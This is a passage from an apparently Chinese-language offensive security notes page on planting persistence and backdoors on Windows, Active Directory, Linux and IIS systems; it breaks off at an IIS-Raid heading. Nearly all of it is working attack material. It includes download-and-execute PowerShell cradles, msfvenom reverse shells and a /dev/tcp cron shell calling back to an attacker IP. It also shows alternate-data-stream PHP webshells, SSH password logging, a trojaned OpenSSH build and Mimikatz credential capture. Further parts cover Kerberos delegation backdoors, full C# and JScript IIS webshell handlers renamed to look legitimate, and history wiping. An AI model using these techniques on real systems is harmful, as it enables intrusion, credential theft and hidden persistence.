&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1&#39;); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments &#39;Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1&#39;&quot;
</code></pre>
<p><img src="536.png" alt="image"><br><img src="537.png" alt="image"><br><img src="538.png" alt="image"><br>    生成<br>    &gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads<br>    #use exploit/multi/handler<br>    #set payload windows/x64/meterpreter/reverse_https<br>    #run</p>
<h3 id="ADS隐藏webshell"><a href="#ADS隐藏webshell" class="headerlink" title="ADS隐藏webshell"></a>ADS隐藏webshell</h3><pre><code>指定宿主文件，index.php是网页正常文件
&gt;echo ^&lt;?php @eval($_POST[&#39;chopper&#39;]);?^&gt; &gt; index.php:hidden.jpg
&lt;?php include(‘index.php:hidden.jpg’)?&gt;
&lt;?php 
$a=&quot;696E6465782E7068703&quot;.&quot;A68696464656E2E6A7067&quot;;#hex编码
$b=&quot;a&quot;;
include(PACK(&#39;H*&#39;,$$b))
?&gt;
&gt;echo 9527 &gt; 1.txt:flag.txt
&gt;notepad 1.txt:flag.txt
或不指定宿主文件
&gt;echo hide &gt; :key.txt
&gt;cd ../
&gt;notepad test:key.txt
上传处绕过
</code></pre>
<table>
<thead>
<tr>
<th>上传的文件名</th>
<th>服务器表面现象</th>
<th>生成的文件内容</th>
</tr>
</thead>
<tbody><tr>
<td>test.php:a.jpg</td>
<td>生成test.php</td>
<td>空</td>
</tr>
<tr>
<td>test.php::$DATA</td>
<td>生成test.php</td>
<td><?php phpinfo();?></td>
</tr>
<tr>
<td>test.php::$INDEX_ALLOCATION</td>
<td>生成test.php文件夹</td>
<td>\</td>
</tr>
<tr>
<td>test.php::$DATA\0.jpg</td>
<td>生成0.jpg</td>
<td><?php phpinfo();?></td>
</tr>
</tbody></table>
<h3 id="ADS-amp-JavaScript"><a href="#ADS-amp-JavaScript" class="headerlink" title="ADS&amp;JavaScript"></a>ADS&amp;JavaScript</h3><pre><code>创建一个txt文件，test.txt，随便添加内容（实际的工具，即用户要用的那个工具）。
将程序写入文件流（此处用calc.exe）
&gt;type calc.exe &gt; test.txt:calc.exe
使用mklink创建文件链接：
&gt;mklink config.txt test.txt:calc.exe
创建readme.txt，文件内容随便。设置为隐藏。
创建readme.js，内容如下：
var objShell = new ActiveXObject(&quot;shell.application&quot;);
objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;/c config.txt&quot;, &quot;&quot;, &quot;open&quot;, 0);
objShell.ShellExecute(&quot;README.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1);
执行readme.js，运行calc.exe ，打开readme.txt
</code></pre>
<h3 id="Empire-3"><a href="#Empire-3" class="headerlink" title="Empire"></a>Empire</h3><h4 id="LNK后门"><a href="#LNK后门" class="headerlink" title="LNK后门"></a>LNK后门</h4><pre><code>Empire
Empire&gt; set Host http://192.168.1.150
Empire&gt; set Port 8080
&gt;launcher powershell Listener&#39;s Name
生成后只使用Base64的代码。
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -EncScript Base64编码&quot;
</code></pre>
<p><img src="539.png" alt="image"><br><img src="540.png" alt="image"><br><img src="541.png" alt="image"><br><img src="542.png" alt="image"></p>
<pre><code>清除后门
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-BackdoorLNK.ps1&#39;);Invoke-BackdoorLNK -LNKPath &#39;C:\Users\Administrator.DC\Desktop\Easy CHM.lnk&#39; -CleanUp&quot;
</code></pre>
<p><img src="543.png" alt="image"></p>
<h4 id="WMI-2"><a href="#WMI-2" class="headerlink" title="WMI"></a>WMI</h4><pre><code>Empire&gt;powershell/persistence/elevated/wmi
</code></pre>
<h3 id="注入SSP被动收集密码"><a href="#注入SSP被动收集密码" class="headerlink" title="注入SSP被动收集密码"></a>注入SSP被动收集密码</h3><pre><code>需高权限
</code></pre>
<h4 id="Mimikatz-3"><a href="#Mimikatz-3" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>重启失效
&gt;privilege::debug
&gt;misc::memssp
锁屏
&gt;rundll32.exe user32.dll,LockWorkStation
</code></pre>
<p><img src="544.png" alt="image"></p>
<pre><code>登录的账号密码保存在
C:\Windows\System32\mimilsa.log
</code></pre>
<p><img src="545.png" alt="image"></p>
<pre><code>重启有效
将mimikatz中的mimilib.dll放入system32目录
&gt;reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot; 查看注册表
&gt;reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ  添加mimilib
</code></pre>
<p><img src="546.png" alt="image"></p>
<pre><code>有账号登录密码保存在C:\Windows\System32\kiwissp.log重启也有效
</code></pre>
<p><img src="547.png" alt="image"></p>
<h4 id="Empire-4"><a href="#Empire-4" class="headerlink" title="Empire"></a>Empire</h4><pre><code>复制mimilib.dll到system32文件夹中
&gt;shell copy mimilib.dll C:\Windows\System32\
使用模块
&gt;usemodule persistence/misc/install_ssp*
&gt;set Path C:\Users\Administrator\mimilib.dll
</code></pre>
<h4 id="Powersploit-1"><a href="#Powersploit-1" class="headerlink" title="Powersploit"></a>Powersploit</h4><pre><code>&gt;Import-Module .\PowerSploit.psm1
&gt;Install-SSP -Path .\mimilib.dll
</code></pre>
<h3 id="基于域策略文件权限后门"><a href="#基于域策略文件权限后门" class="headerlink" title="基于域策略文件权限后门"></a>基于域策略文件权限后门</h3><pre><code>域的组策略和脚本存放在域控机的C:\Windows\SYSVOL\sysvol\zone.com\Policies目录，域内机器定时访问以更新策略
域控机设置policies为everyone完全控制
&gt;cacls C:\Windows\SYSVOL\sysvol\zone.com\Policies /e /t /c /g &quot;EveryOne&quot;:f
</code></pre>
<p><img src="548.png" alt="image"></p>
<pre><code>使用powerview查询域内机对应策略文件
PS&gt; Get-NETGPO -ComputerName sub2k8.zone.com |fl gpcfilesyspath
打开C:\Windows\SYSVOL\sysvol\zone.com\Policies\&#123;id&#125;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf末尾添加
[Registry Values] MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger=1,c:\windows\system32\calc.exe [Version] signature=&quot;$CHICAGO$&quot; Revision=1
手动刷新策略
&gt;gpupdate /force
劫持taskhost.exe，可替换c:\windows\system32\calc.exe为后门文件或语句。
</code></pre>
<h3 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h3><pre><code>当有setspn权限时，为域用户添加一个SPN
&gt;setspn -U -A RDP/zone.com godadmin
</code></pre>
<p><img src="549.png" alt="image"></p>
<pre><code>域内任何主机可以使用Kerberoast 获得TGS
https://github.com/malachitheninja/Invoke-Kerberoast
</code></pre>
<p><img src="550.png" alt="image"></p>
<pre><code>&gt;Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation |Out-File xx.txt
</code></pre>
<p><img src="551.png" alt="image"></p>
<pre><code>或使用rubeus.exe
</code></pre>
<p><img src="552.png" alt="image"></p>
<pre><code>破解
&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
</code></pre>
<h3 id="S4U2Self后门"><a href="#S4U2Self后门" class="headerlink" title="S4U2Self后门"></a>S4U2Self后门</h3><pre><code>域控执行，寻找具备SPN且密码永不过期的账户
&gt;Get-ADUser -Filter * -Properties ServicePrincipalName,PasswordNeverExpires| ? &#123;($_.ServicePrincipalName -ne &quot;&quot;) -and ($_.PasswordNeverExpires -eq $true)&#125;
</code></pre>
<p><img src="553.png" alt="image"></p>
<pre><code>使用mimikatz的dcsync提取用户hash
&gt;lsadump::dcsync /domain:zone.com /user:y
</code></pre>
<p><img src="554.png" alt="image"></p>
<pre><code>布置后门
&gt;Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount 账户
</code></pre>
<p><img src="555.png" alt="image"></p>
<pre><code>布置完成后利用，登录账户y
触发后门
&gt;Rubeus.exe s4u /user:y /aes256:&#123;aes256&#125; /domain:zone.com /msdsspn:krbtgt /impersonateuser:godadmin
</code></pre>
<p><img src="556.png" alt="image"></p>
<pre><code>注入票据，获取域控的CIFS、LDAP服务
&gt;Rubeus.exe asktgs /ticket:&#123;&#125; /service:cifs/dc.zone.com,ldap/dc.zone.com /ptt
</code></pre>
<p><img src="557.png" alt="image"><br><img src="558.png" alt="image"><br><img src="559.png" alt="image"><br><img src="560.png" alt="image"></p>
<h3 id="受限委派后门"><a href="#受限委派后门" class="headerlink" title="受限委派后门"></a>受限委派后门</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1
新增一个受限委派服务账户，或添加受限委派后门功能给一个已知账户密码存在的服务账户。
需运行在域控制器上，本次演示的是新建后门账户，若是给已知账户密码的服务账户添加功能，步骤一致。
PS &gt; Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com
密码默认为Password@123!可以修改脚本中$Password参数修改密码。
</code></pre>
<p><img src="561.png" alt="image"><br><img src="562.png" alt="image"></p>
<pre><code>https://github.com/samratashok/ADModule
导入ADModule中的Microsoft.ActiveDirectory.Management.dll和Import-ActiveDirectory.ps1
&gt;Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
&gt;Import-Module Import-ActiveDirectory.ps1
现以域内普通用户y登录一台域内机器sub2k8，使用kekeo获取TGT
Kekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!
</code></pre>
<p><img src="563.png" alt="image"></p>
<pre><code>Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.com获取以域管理身份访问ldap的TGS 
</code></pre>
<p><img src="564.png" alt="image"></p>
<pre><code>使用mimikatz写入TGS票据
mimikatz#kerberos::ptt C:\Users\y.ZONE\Desktop\kekeo\x64\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi
</code></pre>
<p><img src="565.png" alt="image"></p>
<pre><code>接下来就可以dcsync导出krbtgt的hash，通过krbtgt伪造黄金票据
mimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com
</code></pre>
<p><img src="566.png" alt="image"></p>
<h3 id="Skeleton-Key万能钥匙"><a href="#Skeleton-Key万能钥匙" class="headerlink" title="Skeleton Key万能钥匙"></a>Skeleton Key万能钥匙</h3><pre><code>域控上使用mimikatz执行
&gt;privilege::debug
&gt;misc::skeleton
</code></pre>
<p><img src="567.png" alt="image"></p>
<pre><code>可以使用域内任何账号以密码mimikatz登录任意域内主机
使用Empire模块
&gt;usemodule persistence/misc/skeleton_key*
绕过LSA Protection
&gt;privilege::debug
&gt;!+
&gt;!processprotect /process:lsass.exe /remove
&gt;misc::skeleton
</code></pre>
<h3 id="唯一IP访问"><a href="#唯一IP访问" class="headerlink" title="唯一IP访问"></a>唯一IP访问</h3><pre><code>&gt;msfvenom -p windows/shell_hidden_bind_tcp LPORT=443 AHOST=192.168.0.107 -f exe &gt; svchost.exe
只有当107这台机器连接时可获得shell，其他机器不可以。
</code></pre>
<p><img src="568.png" alt="image"><br><img src="569.png" alt="image"><br><img src="570.png" alt="image"></p>
<h3 id="Linux-cron后门"><a href="#Linux-cron后门" class="headerlink" title="Linux cron后门"></a>Linux cron后门</h3><pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw &gt; /var/www/html/shell.sh
(crontab -l;printf &quot;*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre>
<p><img src="571.png" alt="image"></p>
<pre><code>#!bash
(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.1.1/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
</code></pre>
<h3 id="Strace记录ssh密码"><a href="#Strace记录ssh密码" class="headerlink" title="Strace记录ssh密码"></a>Strace记录ssh密码</h3><pre><code>安装strace
#apt-get install strace
#vi ~/.bashrc
添加
alias ssh=&#39;strace -o /tmp/.log -e read,write,connect -s 2048 ssh&#39;
</code></pre>
<h3 id="SSHD后门"><a href="#SSHD后门" class="headerlink" title="SSHD后门"></a>SSHD后门</h3><pre><code>&gt;ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;
执行后开启31337端口，使用root任意密码登录
&gt;ssh root@192.168.1.1 -p 31337
</code></pre>
<h3 id="进程注入-1"><a href="#进程注入-1" class="headerlink" title="进程注入"></a>进程注入</h3><pre><code>http://cymothoa.sourceforge.net/
靶机&gt;./cymothoa -p 进程PID -s 1 -y 端口
攻击机&gt;nc -vv ip 端口
</code></pre>
<h3 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h3><pre><code>#cd /usr/sbin
#mv sshd ../bin
#echo &#39;#!/usr/bin/perl&#39; &gt;sshd
#echo &#39;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd
#echo &#39;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd
#chmod u+x sshd
#/etc/init.d/sshd restart
攻击机执行
&gt;socat STDIO TCP4:192.168.0.110:22,sourceport=13377
</code></pre>
<p><img src="572.png" alt="image"></p>
<h3 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h3><pre><code>&gt;cp /bin/bash /tmp/tmp
&gt;chmod u+s /tmp/tmp
&gt;/tmp/tmp -p
</code></pre>
<h3 id="SSH公私钥登录"><a href="#SSH公私钥登录" class="headerlink" title="SSH公私钥登录"></a>SSH公私钥登录</h3><pre><code>&gt;vim /etc/ssh/sshd_conf取消以下注释
</code></pre>
<p><img src="573.png" alt="image"></p>
<pre><code>&gt;ssh-keygen生成
复制/root/.ssh/id_rsa.pub文件到攻击端的/root/.ssh/authorized_keys
&gt;ssh -i id_rsa targer@1.1.1.1
</code></pre>
<h3 id="Reptile"><a href="#Reptile" class="headerlink" title="Reptile"></a>Reptile</h3><pre><code>https://github.com/f0rb1dd3n/Reptile
安装
&gt;apt install build-essential libncurses-dev linux-headers-$(uname -r)
&gt;git clone https://github.com/f0rb1dd3n/Reptile.git
</code></pre>
<h3 id="Kbeast-rootkit"><a href="#Kbeast-rootkit" class="headerlink" title="Kbeast_rootkit"></a>Kbeast_rootkit</h3><pre><code>http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
version - 0 : 2.6.18 (RHEL/CentOS 5.x)
          1 : 2.6.32 (Ubuntu 10.x) [default version]
修改配置config.h
安装路径、日志路径、端口、连接密码、连接用户
</code></pre>
<p><img src="574.png" alt="image"></p>
<pre><code>./setup build
攻击机连接
&gt;telnet 192.168.1.1 13377
</code></pre>
<h3 id="OpenSSH后门"><a href="#OpenSSH后门" class="headerlink" title="OpenSSH后门"></a>OpenSSH后门</h3><pre><code>下载
http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
备份配置文件
&gt;mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
&gt;mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
安装关联文件
centos
&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel
Ubuntu
&gt;apt-get install -y openssl libssl-dev libpam0g-dev
&gt;tar zxvf openssh-5.9p1.tar.gz 
&gt;tar zxvf 0x06-openssh-5.9p1.patch.tar.gz 
&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/
&gt;cd openssh-5.9p1
&gt;patch &lt;sshbd5.9p1.diff
&gt;vim includes.h
</code></pre>
<p><img src="575.png" alt="image"></p>
<pre><code>/tmp/ilog记录登录到本机的用户密码
/tmp/olog记录本机登录其他机器的账户密码
日志文件前可以加个.隐藏起来
SECRETPW是连接后门密码
查看当前版本
&gt;ssh -V
</code></pre>
<p><img src="576.png" alt="image"></p>
<pre><code>修改version.h改为当前版本
</code></pre>
<p><img src="577.png" alt="image"></p>
<pre><code>编译安装
Centos7
&gt;./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5
&gt;make clean
&gt;make &amp;&amp; make install
&gt;systemctl restart sshd.service
ubuntu
&gt;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam
&gt;make clean
&gt;make&amp;&amp;make install
重启服务，修改文件日志
&gt;touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
&gt;touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
</code></pre>
<p><img src="578.png" alt="image"><br><img src="579.png" alt="image"></p>
<pre><code>清除痕迹
&gt;export HISTFILE=/dev/null
&gt;export HISTSIZE=0
&gt;export HISTFILESIZE=0
&gt;sed -i &#39;s/192.168.0.1/127.0.0.1/g&#39; /root/.bash_history
</code></pre>
<h3 id="IPTables端口复用"><a href="#IPTables端口复用" class="headerlink" title="IPTables端口复用"></a>IPTables端口复用</h3><pre><code>&gt;iptables -t nat -N LETMEIN 
&gt;iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启开关
&gt;iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭开关
&gt;iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT
&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
攻击端：
#开启复用
&gt;echo threathuntercoming | socat - tcp:192.168.0.110:80
#ssh使用80端口进行登录
ssh -p 80 root@192.168.0.110
#关闭复用
echo threathunterleaving | socat - tcp:192.168.0.110:80
</code></pre>
<p><img src="580.png" alt="image"></p>
<h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><pre><code>&gt;chattr +I shell.sh
</code></pre>
<p><img src="581.png" alt="image"></p>
<pre><code>&gt;vim .shell.sh
</code></pre>
<p><img src="582.png" alt="image"></p>
<pre><code>&gt;attrib +s +h +r 1.txt
</code></pre>
<p><img src="583.png" alt="image"></p>
<pre><code>&gt;touch -r 1.file 2.file 修改2file文件的时间跟1file时间相同
</code></pre>
<h3 id="IIS-Bin-Backdoor"><a href="#IIS-Bin-Backdoor" class="headerlink" title="IIS_Bin_Backdoor"></a>IIS_Bin_Backdoor</h3><pre><code>From:https://github.com/WBGlIl/IIS_backdoor
IIS_backdoor_dll.dl放入 web 目录的 bin 文件夹中配置 web.config 文件
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;IIS_backdoor&quot;</span> <span class="attr">type</span>=<span class="string">&quot;IIS_backdoor_dll.IISModule&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<pre><code>IIS_backdoor_shell.exe执行命令
</code></pre>
<p><img src="584.png" alt="image"></p>
<pre><code>使用IISBackdoor太明显，容易被看出是后门，这里对后门改名
</code></pre>
<p><img src="585.png" alt="image"><br><img src="586.png" alt="image"><br><img src="587.png" alt="image"></p>
<pre><code>重新生成解决方案，dll放入bin目录，web.config修改为
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">      		<span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;UrlRoutingModule&quot;</span> <span class="attr">type</span>=<span class="string">&quot;UrlRoutingModule.IISModule&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>添加完之后会自动在模块中注册好
</code></pre>
<p><img src="588.png" alt="image"></p>
<pre><code>执行payload，msf生成raw格式payload，选择shellcode选项，raw文件拖入即可
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.raw
</code></pre>
<p><img src="589.png" alt="image"></p>
<h3 id="IIS-NETDLL-Spy"><a href="#IIS-NETDLL-Spy" class="headerlink" title="IIS_NETDLL_Spy"></a>IIS_NETDLL_Spy</h3><pre><code>From:https://github.com/Ivan1ee/NetDLLSpy
原作者提及三种方式，第一种编译代码为DLL新建aspx文件实例化后门类来执行命令，第二种是做httphandler映射可指定一个后缀执行命令保存文件在web服务器上，再读取结果。第三种是使用jsc.exe编译js脚本生成dll，添加映射菜刀连接。
这里根据原作者的代码，进行了一下简单的修改，修改后的功能为添加httphandler映射指定一个后缀执行命令显示在页面上，不用保存在服务器中再访问。
代码
</code></pre>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IsapiModules</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Handler</span> : <span class="title">IHttpHandler</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">bool</span> IsReusable</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ProcessRequest</span>(<span class="params">HttpContext context</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="built_in">string</span> input = context.Request.Form[<span class="string">&quot;InternetInformationService&quot;</span>];  <span class="comment">//command</span></span><br><span class="line">			<span class="keyword">if</span> (context.Request.Form[<span class="string">&quot;microsoft&quot;</span>] == <span class="string">&quot;iis&quot;</span>)<span class="comment">//do command</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">this</span>.cmdShell(input);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cmdShell</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			Process process = <span class="keyword">new</span> Process();</span><br><span class="line">			process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">			process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">			process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">			process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + input;</span><br><span class="line">			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;</span><br><span class="line">			process.Start();</span><br><span class="line">			StreamReader output = process.StandardOutput;</span><br><span class="line">			String result = output.ReadToEnd();</span><br><span class="line">			output.Close();</span><br><span class="line">			output.Dispose();</span><br><span class="line">			HttpContext.Current.Response.Write(result);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>保存为随意后缀，使用csc编译。
&gt;C:\Windows\Microsoft.NET\Framework\v2.50727\csc.exe /t:library /r:System.Web.dll -out:C:\inetpub\wwwroot\Bin\SystemIO.dll C:\inetpub\wwwroot\bin\code.cs
</code></pre>
<p><img src="590.png" alt="image"></p>
<pre><code>Web.config文件添加
&lt;system.webServer&gt;
    &lt;handlers&gt; 
        &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.xxx&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt; 
    &lt;/handlers&gt; 
&lt;/system.webServer&gt;
</code></pre>
<p><img src="001.png" alt="image"></p>
<pre><code>打开IIS管理器，可以看到处理映射管理器中已经添加了模块。
</code></pre>
<p><img src="591.png" alt="image"></p>
<pre><code>现在随意访问个xxx后缀的文件
</code></pre>
<p><img src="592.png" alt="image"></p>
<pre><code>带参数访问
microsoft=iis&amp;InternetInformationService=net user
</code></pre>
<p><img src="593.png" alt="image"><br><img src="594.png" alt="image"></p>
<pre><code>第三种连接菜刀，这里也对代码修改了一下。
</code></pre>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> System; </span><br><span class="line"><span class="keyword">import</span> System.Web; </span><br><span class="line"><span class="keyword">import</span> System.IO; </span><br><span class="line">package IsapiModule</span><br><span class="line">&#123; </span><br><span class="line">	public <span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="title">implements</span> <span class="title">IHttpHandler</span></span></span><br><span class="line"><span class="class">	</span>&#123; </span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">IHttpHandler</span>.<span class="title">ProcessRequest</span>(<span class="params">context : HttpContext</span>)</span></span><br><span class="line"><span class="function">		</span>&#123; </span><br><span class="line">			context.Response.Write(<span class="string">&quot;404 Not Found&quot;</span>) </span><br><span class="line">			<span class="keyword">var</span> I = context; </span><br><span class="line">			<span class="keyword">var</span> Request = I.Request; </span><br><span class="line">			<span class="keyword">var</span> Response = I.Response; </span><br><span class="line">			<span class="keyword">var</span> Server = I.Server; </span><br><span class="line">			<span class="built_in">eval</span>(context.Request[<span class="string">&quot;Internet&quot;</span>]); <span class="comment">//pass</span></span><br><span class="line">		&#125; </span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">get</span> <span class="title">IHttpHandler</span>.<span class="title">IsReusable</span>(<span class="params"></span>) : <span class="title">Boolean</span></span>&#123; <span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>使用jsc编译
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library -out:C:\inetpub\wwwroot\Bin\IsapiModule.Handler.dll C:\inetpub\wwwroot\bin\code.js
</code></pre>
<p><img src="595.png" alt="image"></p>
<pre><code>编辑web.config，添加映射，这里指定的后缀是.iis
&lt;system.webServer&gt; 
&lt;modules runAllManagedModulesForAllRequests=&quot;true&quot;/&gt; &lt;directoryBrowse enabled=&quot;true&quot;/&gt;
&lt;staticContent&gt;
 &lt;mimeMap fileExtension=&quot;.json&quot; mimeType=&quot;application/json&quot; /&gt; 
 &lt;/staticContent&gt; 
&lt;handlers&gt;
 &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32-1&quot; path=&quot;*.iis&quot; verb=&quot;*&quot; type=&quot;IsapiModule.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt;
 &lt;/handlers&gt;
&lt;/system.webServer&gt;
已自动加入了映射。现在随便访问个iis后缀的文件。
</code></pre>
<p><img src="596.png" alt="image"><br><img src="597.png" alt="image"></p>
<pre><code>可使用菜刀直接连接
</code></pre>
<p><img src="598.png" alt="image"><br><img src="599.png" alt="image"></p>
<h3 id="IIS-RAID"><a href="#IIS-RAID" class="headerlink" title="IIS_RAID"></a>IIS_RAID</h3><pre><code>From:https://github.com/0x09AL/IIS-Raid
在vs2019下编译
